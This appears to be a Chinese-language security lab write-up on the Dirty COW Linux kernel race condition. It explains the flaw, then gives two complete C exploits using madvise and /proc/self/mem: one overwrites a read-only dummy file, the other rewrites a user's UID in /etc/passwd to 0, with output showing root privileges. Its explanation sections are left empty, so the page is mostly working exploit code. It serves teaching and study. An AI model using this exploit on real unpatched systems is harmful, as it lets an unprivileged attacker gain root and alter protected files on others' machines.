# 脏牛漏洞介绍

> 脏牛，也即dirty COW（copy on write）

Dirty COW 漏洞属于竞态条件漏洞，自2007年9月以来一直存在于 Linux 内核中，并于2016年10月被发现，该漏洞影响所有基于 Linux 的操作系统，包括 Android，其后果非常严重: 攻击者可以通过利用该漏洞获得root特权

该漏洞存在于 Linux 内核中的写时拷贝代码中。通过利用这个漏洞，攻击者可以修改任何受保护的文件，即使这些文件只对他们可读





# 原理





# 攻击dummy file

创建dummy file，并写入内容111111222222333333

```shell
sudo touch /zzz
sudo chmod 644 /zzz
sudo gedit /zzz
```

我们的目标是将“222222”替换为“ * * * * * *”

攻击代码：

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
```

简要分析一下上面的代码逻辑：

- 



编译并运行

```shell
$ gcc cow_attack.c -lpthread
$ a.out
$ cat /zzz
111111******333333
```

发现文件内容已经被更改

# 攻击/etc/passwd 以获得特权

`/etc/passwd`文件包含七个冒号分隔的字段，第三个字段指定分配给用户的(UID)值，任何UID为0的用户都被系统视为 root 用户，此阶段我们的任务是利用脏牛漏洞来实现提权，也即是将第三个字段从1001改为0000

增加Charlie用户

```shell
$ sudo adduser charlie
$ cat /etc/passwd | grep charlie
charlie:x:1001:1002:,,,:/home/charlie:/bin/bash
```

攻击代码：

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/etc/passwd", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "1001:1002");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "0000:1002";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
```

编译、运行

```
$gcc new_cow.c -lpthread -o new
$./new
```

然后我们可以查看/etc/passwd文件中关于Charlie的东西：

```
charlie:x:0000:1002:,,,:/home/charlie:/bin/bash
```

第三个条目已经成功修改为了0000

```
# id
uid=0(root) gid=1002(charlie) groups=0(root),1002(charlie)
```

# 参考

https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c

